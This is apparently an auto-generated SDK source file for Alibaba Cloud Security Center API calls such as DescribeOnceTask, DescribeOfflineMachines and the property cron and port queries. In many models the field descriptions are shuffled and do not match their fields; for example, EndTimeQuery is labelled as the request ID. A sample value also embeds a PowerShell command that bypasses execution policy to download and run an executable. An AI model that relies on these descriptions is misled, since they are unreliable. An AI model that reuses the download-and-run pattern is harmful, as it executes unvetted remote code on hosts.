  };
  return callApi(params, req, runtime);
}

async function describeNoticeConfig(request: DescribeNoticeConfigRequest): DescribeNoticeConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeNoticeConfigWithOptions(request, runtime);
}

model DescribeNsasSuspEventTypeRequest {
  containerFieldName?: string(name='ContainerFieldName', example='clusterId'),
  containerFieldValue?: string(name='ContainerFieldValue', example='ca3108551c83c4d949106e1ab9e1e****'),
  from?: string(name='From', example='sas'),
  lang?: string(name='Lang', example='zh'),
  name?: string(name='Name', example='Unusual Logon'),
  remark?: string(name='Remark', example='testECS'),
  sourceIp?: string(name='SourceIp', example='180.212.XX.XX'),
  uuids?: string(name='Uuids', example='f56406cb-916d-42db-b6f7-2ff79e34****'),
}

model DescribeNsasSuspEventTypeResponseBody = {
  eventTypes?: [ 
    {
      name?: string(name='Name', example='Unusual Logon'),
      suspEventCount?: int32(name='SuspEventCount', example='22'),
      type?: string(name='Type', example='Unusual Logon'),
    }
  ](name='EventTypes'),
  requestId?: string(name='RequestId', example='9FBC6E47-7508-58C9-9E76-528E118CB1CC'),
}

model DescribeNsasSuspEventTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeNsasSuspEventTypeResponseBody(name='body'),
}

async function describeNsasSuspEventTypeWithOptions(request: DescribeNsasSuspEventTypeRequest, runtime: Util.RuntimeOptions): DescribeNsasSuspEventTypeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeNsasSuspEventType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeNsasSuspEventType(request: DescribeNsasSuspEventTypeRequest): DescribeNsasSuspEventTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeNsasSuspEventTypeWithOptions(request, runtime);
}

model DescribeOfflineMachinesRequest {
  currentPage?: int32(name='CurrentPage', example='4'),
  os?: string(name='Os', example='linux'),
  pageSize?: int32(name='PageSize', example='5'),
  regionIdStr?: string(name='RegionIdStr', example='cn-hangzhou'),
  regionNo?: string(name='RegionNo', example='cn-hangzhou'),
  remark?: string(name='Remark', example='172.20.XX.XX'),
  sourceIp?: string(name='SourceIp', example='180.113.XX.XX'),
  vendor?: int32(name='Vendor', example='0'),
}

model DescribeOfflineMachinesResponseBody = {
  currentPage?: int32(name='CurrentPage', example='1'),
  machineList?: [ 
    {
      instanceId?: string(name='InstanceId', example='sas-bdrvxb4b****'),
      instanceName?: string(name='InstanceName', example='sql-test-001'),
      internetIp?: string(name='InternetIp', example='120.79.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='192.168.XX.XX'),
      machineRegion?: string(name='MachineRegion', example='cn-hangzhou'),
      os?: string(name='Os', example='linux'),
      regionId?: string(name='RegionId', example='cn-shanghai'),
      uuid?: string(name='Uuid', example='6d5b361f-958d-48a8-a9d2-d6e82c1****'),
      vendor?: int32(name='Vendor', example='0'),
      vendorName?: string(name='VendorName', example='ALIYUN'),
    }
  ](name='MachineList'),
  pageSize?: int32(name='PageSize', example='5'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  totalCount?: int32(name='TotalCount', example='44'),
}

model DescribeOfflineMachinesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeOfflineMachinesResponseBody(name='body'),
}

async function describeOfflineMachinesWithOptions(request: DescribeOfflineMachinesRequest, runtime: Util.RuntimeOptions): DescribeOfflineMachinesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.os)) {
    query['Os'] = request.os;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionIdStr)) {
    query['RegionIdStr'] = request.regionIdStr;
  }
  if (!Util.isUnset(request.regionNo)) {
    query['RegionNo'] = request.regionNo;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeOfflineMachines',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeOfflineMachines(request: DescribeOfflineMachinesRequest): DescribeOfflineMachinesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeOfflineMachinesWithOptions(request, runtime);
}

model DescribeOnceTaskRequest {
  currentPage?: int32(name='CurrentPage', description='The pagination information.', example='1'),
  endTimeQuery?: long(name='EndTimeQuery', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1651766520000'),
  pageSize?: int32(name='PageSize', description='The page number of the returned page.', example='20'),
  rootTaskId?: string(name='RootTaskId', description='The ID of the task.', example='bb5d657479bba5e1d308b6c9e85c9174'),
  startTimeQuery?: long(name='StartTimeQuery', description='The data returned.', example='1651737301000'),
  taskId?: string(name='TaskId', description='The number of entries returned per page. Default value: **20**.', example='d7b2acf8d362742123e4a84e1bf8****'),
  taskType?: string(name='TaskType', description='The number of entries to return on each page. Default value: **20**.', example='CLIENT_PROBLEM_CHECK'),
}

model DescribeOnceTaskResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The status of the task. Valid values:

*   **1**: started
*   **2**: complete
*   **3**: failed
*   **4**: timed out', example='2'),
    currentPage?: int32(name='CurrentPage', description='The information about the task.', example='1'),
    pageSize?: int32(name='PageSize', description='The type of the task. Valid values:

*   **CLIENT\\_PROBLEM_CHECK**: a task of the Security Center agent
*   **CLIENT\\_DEV_OPS**: an O\\&M task of Cloud Assistant
*   **ASSET\\_SECURITY_CHECK**: a task of asset information collection', example='20'),
    totalCount?: int32(name='TotalCount', description='The progress of the task. Unit: percent (%).', example='100'),
  }(name='PageInfo', description='An array that consists of the tasks.'),
  requestId?: string(name='RequestId', description='The number of entries returned on the current page.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  taskManageResponseList?: [ 
    {
      detailData?: string(name='DetailData', description='The ID of the task.', example='[
      {
            "dispatchType": "manual",
            "causeMsg": [],
            "causeCode": [],
            "resCode": [
                  "1003"
            ],
            "resMsg": [
                  "powershell -executionpolicy bypass -c \\"(New-Object Net.WebClient).DownloadFile(\\"http://aegis.alicdn.com/download/aegis_client_self_check/win32/aegis_checker.exe\\", $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(\\".\\\\\\\\aegis_checker.exe\\"))\\"; \\"./aegis_checker.exe -b eyJtb2RlIjoxLCJqc3J2X2RvbWFpbiI6W10sImlzc3VlIjoib2ZmbGluZSIsInVwZGF0ZV9kb21haW4iOltdLCJ1dWlkIjoiaW5ldC1lYWUwNDg2Ny0wMDJmLTQyM2QtYWYwMC1jNzJjZDYyOWIyNDgiLCJjbWRfaWR4IjoiNDRjZThiZWI3ZGYyYTQxMjQ1NGM4ZDc5OTE1ODI1MzMifQ==\\""
            ],
            "problemType": "offline",
            "uuid": "inet-eae04867-002f-423d-af00-c72cd629****"
      }
]'),
      failCount?: int32(name='FailCount', example='2'),
      progress?: string(name='Progress', description='The timestamp when the task starts. Unit: milliseconds.', example='10%'),
      resultInfo?: string(name='ResultInfo', example='successful'),
      successCount?: int32(name='SuccessCount', example='7'),
      taskEndTime?: long(name='TaskEndTime', example='1650267989000'),
      taskId?: string(name='TaskId', example='e900f528f5a6229bb640ca27cb44c98e'),
      taskName?: string(name='TaskName', description='The number of tasks that failed.', example='CLIENT_PROBLEM_CHECK'),
      taskStartTime?: long(name='TaskStartTime', description='The execution result of the task.', example='1649732012000'),
      taskStatus?: int32(name='TaskStatus', description='The timestamp when the task ends. Unit: milliseconds.', example='1'),
      taskStatusText?: string(name='TaskStatusText', description='The number of tasks that succeeded.', example='INIT'),
      taskType?: string(name='TaskType', description='The name of the task.', example='CLIENT_PROBLEM_CHECK'),
    }
  ](name='TaskManageResponseList', description='The execution details of the task. The value of this parameter is in the JSON format.

*   **causeCode**: the returned code for the cause
*   **causeMsg**: the returned information for the cause
*   **resCode**: the returned code of troubleshooting
*   **resMsg**: the returned information about troubleshooting
*   **problemType**: the type of the issue
*   **dispatchType**: the task delivery method
*   **uuid**: the UUID of the server
*   **instanceId**: the instance ID of the server
*   **internetIp**: the public IP address of the server
*   **intranetIp**: the private IP address of the server
*   **instanceName**: the instance name of the server
*   **url**: the download link of the troubleshooting log'),
}

model DescribeOnceTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeOnceTaskResponseBody(name='body'),
}

async function describeOnceTaskWithOptions(request: DescribeOnceTaskRequest, runtime: Util.RuntimeOptions): DescribeOnceTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTimeQuery)) {
    query['EndTimeQuery'] = request.endTimeQuery;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.rootTaskId)) {
    query['RootTaskId'] = request.rootTaskId;
  }
  if (!Util.isUnset(request.startTimeQuery)) {
    query['StartTimeQuery'] = request.startTimeQuery;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeOnceTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeOnceTask(request: DescribeOnceTaskRequest): DescribeOnceTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeOnceTaskWithOptions(request, runtime);
}

model DescribeOnceTaskLeafRecordPageRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  endTime?: long(name='EndTime', description='The end timestamp of the sub-task.', example='1668064495000'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20', example='20'),
  relateInfo?: boolean(name='RelateInfo', description='Specifies whether extension information is associated.', example='true'),
  source?: string(name='Source', description='The source of the request.', example='console_batch'),
  startTime?: long(name='StartTime', description='The start timestamp of the sub-task.', example='1648438617000'),
  statusList?: [ string ](name='StatusList', description='The status information.'),
  taskId?: string(name='TaskId', description='The ID of the sub-task.', example='1471d8ebb96795b41ede090b9758****'),
  taskType?: string(name='TaskType', description='The type of the sub-task. Valid values:

*   **IMAGE_SCAN**: image scan task
*   **IMAGE_REGISTRY_PULL**: image asset synchronization task', example='CLIENT_PROBLEM_CHECK'),
}

model DescribeOnceTaskLeafRecordPageResponseBody = {
  onceTasks?: [ 
    {
      endTime?: long(name='EndTime', description='The time when the sub-task ends.', example='1670307567000'),
      finish?: int32(name='Finish', description='Indicates whether the sub-task is complete.

*   **0**: no
*   **1**: yes', example='1'),
      finishCount?: string(name='FinishCount', description='The number of assets that are scanned.', example='67'),
      progress?: long(name='Progress', description='The progress percentage of the sub-task.', example='75'),
      realRunTime?: long(name='RealRunTime', description='The execution duration of the sub-task.', example='1670307567000'),
      resultInfo?: string(name='ResultInfo', description='The execution result of the task.', example='TASK_NOT_SUPPORT_REGION'),
      startTime?: long(name='StartTime', description='The time when the sub-task starts.', example='1640102400000'),
      status?: string(name='Status', description='The status information.', example='0'),
      statusText?: string(name='StatusText', description='The status of the sub-task. Valid values:

*   **INIT**: The sub-task is not started.
*   **START**: The sub-task is started.
*   **SUCCESS**: The sub-task is complete.
*   **TIMEOUT**: The sub-task timed out.', example='SUCCESS'),
      target?: string(name='Target', description='The objective of the sub-task.', example='238cf050a7270dd6940602e70f1e5a11eeaf4e02035f445b7f613ff5e064****'),
      targetType?: string(name='TargetType', description='The type of the asset on which the sub-task is performed.

*   **IMAGE_REPO**: image repository
*   **IMAGE**: image', example='IMAGE'),
      taskId?: string(name='TaskId', description='The sub-task ID.', example='9fb50f2af8bb67c9fdb684194c83****'),
      taskImageInfo?: {
        appName?: string(name='AppName', description='The name of the application.', example='ack-jenkins-****'),
        clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='a765ba1435e7f9446065370e9a41****'),
        clusterName?: string(name='ClusterName', description='The name of the cluster.', example='ACK-test-****'),
        digest?: string(name='Digest', description='The digest of the image.', example='9e0dc29d872d2e386cc5c0c92b529a84e3acfade16f5cb1d054a2ee3c99****'),
        image?: string(name='Image', description='The image of the container.', example='***s.com/sas_test/baseli***'),
        nodeInstanceId?: string(name='NodeInstanceId', description='The ID of the instance.', example='i-0xi5mxvtmfw9****'),
        nodeIp?: string(name='NodeIp', description='The IP address of the node.', example='172.18.XXX.XXX'),
        nodeName?: string(name='NodeName', description='The name of the node.', example='pztest****'),
        pod?: string(name='Pod', description='The pod of the image.', example='expoit-law-****'),
        regionId?: string(name='RegionId', description='The region of the server image.', example='cn-hangzhou'),
        repoId?: string(name='RepoId', description='The ID of the image repository.', example='crr-r88w2vryp8m****'),
        repoName?: string(name='RepoName', description='The name of the image repository.', example='testyyy'),
        repoNamespace?: string(name='RepoNamespace', description='The name of the namespace to which the image repository belongs.', example='bitn***'),
        repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository.', example='cn-hangzhou'),
        tag?: string(name='Tag', description='The tag that is added to the image.', example='v1.20-002-a2*****'),
      }(name='TaskImageInfo', description='The information about the image scan.'),
      taskName?: string(name='TaskName', description='The name of the sub-task.', example='IMAGE_SCAN'),
      taskType?: string(name='TaskType', description='The type of the sub-task.', example='IMAGE_SCAN'),
      totalCount?: string(name='TotalCount', description='The total number of entries returned.', example='30'),
    }
  ](name='OnceTasks', description='The sub-tasks returned.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='6'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='16'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393****'),
}

model DescribeOnceTaskLeafRecordPageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeOnceTaskLeafRecordPageResponseBody(name='body'),
}

async function describeOnceTaskLeafRecordPageWithOptions(request: DescribeOnceTaskLeafRecordPageRequest, runtime: Util.RuntimeOptions): DescribeOnceTaskLeafRecordPageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.relateInfo)) {
    query['RelateInfo'] = request.relateInfo;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeOnceTaskLeafRecordPage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeOnceTaskLeafRecordPage(request: DescribeOnceTaskLeafRecordPageRequest): DescribeOnceTaskLeafRecordPageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeOnceTaskLeafRecordPageWithOptions(request, runtime);
}

model DescribePropertyCountRequest {
  type?: string(name='Type', description='The UUIDs of the assets. Separate multiple UUIDs with commas (,).', example='port,process'),
  uuidList?: string(name='UuidList', description='The number of scheduled tasks.', example='9658314a-7609-4426-afc4-2c924072****,
9658314a-7609-4426-afc4-2c924072****'),
}

model DescribePropertyCountResponseBody = {
  autorun?: int32(name='Autorun', example='3'),
  cron?: int32(name='Cron', description='The number of middleware assets.', example='123'),
  database?: int32(name='Database', description='DescribePropertyCount', example='2'),
  lkm?: int32(name='Lkm', example='4'),
  port?: int32(name='Port', description='The ID of the request, which is used to locate and troubleshoot issues.', example='22'),
  process?: int32(name='Process', description='The number of accounts.', example='367'),
  requestId?: string(name='RequestId', description='The number of processes.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  sca?: int32(name='Sca', description='port,process', example='112'),
  software?: int32(name='Software', description='The number of web services.', example='111'),
  user?: int32(name='User', description='The number of websites.', example='214'),
  web?: int32(name='Web', description='Queries the statistics of asset fingerprints. The assets include processes, ports, software, accounts, middleware, websites, web services, scheduled tasks, startup items, and databases.', example='65'),
  webserver?: int32(name='Webserver', example='8'),
}

model DescribePropertyCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyCountResponseBody(name='body'),
}

async function describePropertyCountWithOptions(request: DescribePropertyCountRequest, runtime: Util.RuntimeOptions): DescribePropertyCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyCount(request: DescribePropertyCountRequest): DescribePropertyCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyCountWithOptions(request, runtime);
}

model DescribePropertyCronDetailRequest {
  currentPage?: int32(name='CurrentPage', description='1', example='1'),
  extend?: string(name='Extend', description='The details of the scheduled tasks.', example='1'),
  pageSize?: int32(name='PageSize', description='192.168.XX.XX', example='10'),
  remark?: string(name='Remark', description='The public IP address of the server.', example='192.168.XX.XX'),
  source?: string(name='Source', description='Specifies whether fuzzy search by path to the scheduled task is supported. If you want to use fuzzy search, set the parameter to **1**. If you set the parameter to a different value or leave the parameter empty, fuzzy search is not supported.', example='/etc/cron.d/root'),
  user?: string(name='User', description='The path to the scheduled task.', example='root'),
  uuid?: string(name='Uuid', description='50d213b4-3a35-427a-b8a5-04b0c7e1****', example='50d213b4-3a35-427a-b8a5-04b0c7e1****'),
}

model DescribePropertyCronDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The path to the scheduled task.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The UUID of the server.', example='1'),
    pageSize?: int32(name='PageSize', description='The interval at which the scheduled task is performed.', example='10'),
    totalCount?: int32(name='TotalCount', description='The number of entries returned on the current page.', example='1'),
  }(name='PageInfo', description='The username of the account that runs the scheduled task.'),
  propertys?: [ 
    {
      cmd?: string(name='Cmd', description='The number of the page to return. Default value: **1**.', example='/usr/lib64/sa/sa1 1 1'),
      createTimestamp?: long(name='CreateTimestamp', description='DescribePropertyCronDetail', example='1649149566000'),
      instanceId?: string(name='InstanceId', description='The IP addresses of the server.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The ID of the request, which is used to locate and troubleshoot issues.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The pagination information.', example='192.168.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The name of the server.', example='100.104.XX.XX'),
      ip?: string(name='Ip', description='The ID of the server.', example='192.168.XX.XX'),
      md5?: string(name='Md5', description='Queries the details of scheduled tasks on the Host page.', example='4cc8f97c2bf9cbabb2c2be2erqw****'),
      period?: string(name='Period', description='The number of entries returned per page. Default value: **10**.', example='*/10 * * * *'),
      source?: string(name='Source', description='The MD5 hash value of the path to the scheduled task.', example='/etc/cron.d/root'),
      user?: string(name='User', description='root', example='root'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
    }
  ](name='Propertys', description='10'),
  requestId?: string(name='RequestId', description='The username of the account that runs the scheduled task.', example='B0C4E12E-CCE1-109D-9E62-7B95CBBAEF8C'),
}

model DescribePropertyCronDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyCronDetailResponseBody(name='body'),
}

async function describePropertyCronDetailWithOptions(request: DescribePropertyCronDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyCronDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.extend)) {
    query['Extend'] = request.extend;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.user)) {
    query['User'] = request.user;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyCronDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyCronDetail(request: DescribePropertyCronDetailRequest): DescribePropertyCronDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyCronDetailWithOptions(request, runtime);
}

model DescribePropertyCronItemRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  forceFlush?: boolean(name='ForceFlush', example='false'),
  pageSize?: int32(name='PageSize', example='20'),
  source?: string(name='Source', example='/data'),
}

model DescribePropertyCronItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', example='11'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='11'),
  }(name='PageInfo'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', example='23'),
      source?: string(name='Source', example='/data'),
    }
  ](name='PropertyItems'),
  requestId?: string(name='RequestId', example='291B49F9-1685-4005-9D34-606B6F78****'),
}

model DescribePropertyCronItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyCronItemResponseBody(name='body'),
}

async function describePropertyCronItemWithOptions(request: DescribePropertyCronItemRequest, runtime: Util.RuntimeOptions): DescribePropertyCronItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyCronItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyCronItem(request: DescribePropertyCronItemRequest): DescribePropertyCronItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyCronItemWithOptions(request, runtime);
}

model DescribePropertyPortDetailRequest {
  bindIp?: string(name='BindIp', description='The network protocol that is used by the listening port.', example='0.0.XX.XX'),
  currentPage?: int32(name='CurrentPage', description='The name of the server process.', example='1'),
  extend?: string(name='Extend', description='The listening port.', example='1'),
  pageSize?: int32(name='PageSize', description='50d213b4-3a35-427a-b8a5-04b0c7e1****', example='10'),
  port?: string(name='Port', description='The public IP address of the server.', example='22'),
  procName?: string(name='ProcName', description='The IP address that is bound to the listening port.', example='sshd'),
  remark?: string(name='Remark', description='The number of entries to return on each page. Default value: **10**.', example='192.168.XX.XX'),
  uuid?: string(name='Uuid', description='The listening port of the server.', example='50d213b4-3a35-427a-b8a5-04b0c7e1****'),
}

model DescribePropertyPortDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The UUID of the server.', example='1'),
    currentPage?: int32(name='CurrentPage', description='An array that consists of the fingerprints of the ports.', example='1'),
    pageSize?: int32(name='PageSize', description='The ID of the server process that listens on the port.', example='10'),
    totalCount?: int32(name='TotalCount', description='The name of the server process.', example='1'),
  }(name='PageInfo', description='192.168.XX.XX'),
  propertys?: [ 
    {
      bindIp?: string(name='BindIp', description='The pagination information.', example='0.0.X.X'),
      createTimestamp?: long(name='CreateTimestamp', description='Queries the fingerprints of ports on a specified server.', example='1649149566000'),
      instanceId?: string(name='InstanceId', description='The IP address of the network interface controller (NIC) that is bound to the listening port.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The UUID of the server.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The number of entries returned on the current page.', example='192.168.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The number of the page to return. Default value: **1**.', example='100.104.XX.XX'),
      ip?: string(name='Ip', description='The ID of the server.', example='192.168.XX.XX'),
      pid?: string(name='Pid', description='10', example='522'),
      port?: string(name='Port', description='The name of the server.', example='22'),
      procName?: string(name='ProcName', description='sshd', example='sshd'),
      proto?: string(name='Proto', description='The ID of the request, which is used to locate and troubleshoot issues.', example='tcp'),
      uuid?: string(name='Uuid', description='The number of entries returned per page. Default value: **10**.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
    }
  ](name='Propertys', description='Specifies whether fuzzy search by port number is supported. If you want to use fuzzy search, set the parameter to **1**. If you set the parameter to a different value or leave the parameter empty, fuzzy search is not supported.'),
  requestId?: string(name='RequestId', description='0.0.XX.XX', example='0FA7F1F4-488D-52CA-9BFC-3E47793B49D1'),
}

model DescribePropertyPortDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyPortDetailResponseBody(name='body'),
}

async function describePropertyPortDetailWithOptions(request: DescribePropertyPortDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyPortDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.bindIp)) {
    query['BindIp'] = request.bindIp;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.extend)) {
    query['Extend'] = request.extend;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.procName)) {
    query['ProcName'] = request.procName;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyPortDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyPortDetail(request: DescribePropertyPortDetailRequest): DescribePropertyPortDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyPortDetailWithOptions(request, runtime);
}

model DescribePropertyPortItemRequest {
  currentPage?: int32(name='CurrentPage', description='The number of entries to return on each page.', example='1'),
  forceFlush?: boolean(name='ForceFlush', description='The port number.', example='true'),
  pageSize?: int32(name='PageSize', description='The ID of the request.', example='5'),
  port?: string(name='Port', description='The number of the page to return.', example='22'),
}

model DescribePropertyPortItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='An array that consists of the ports returned.', example='5'),
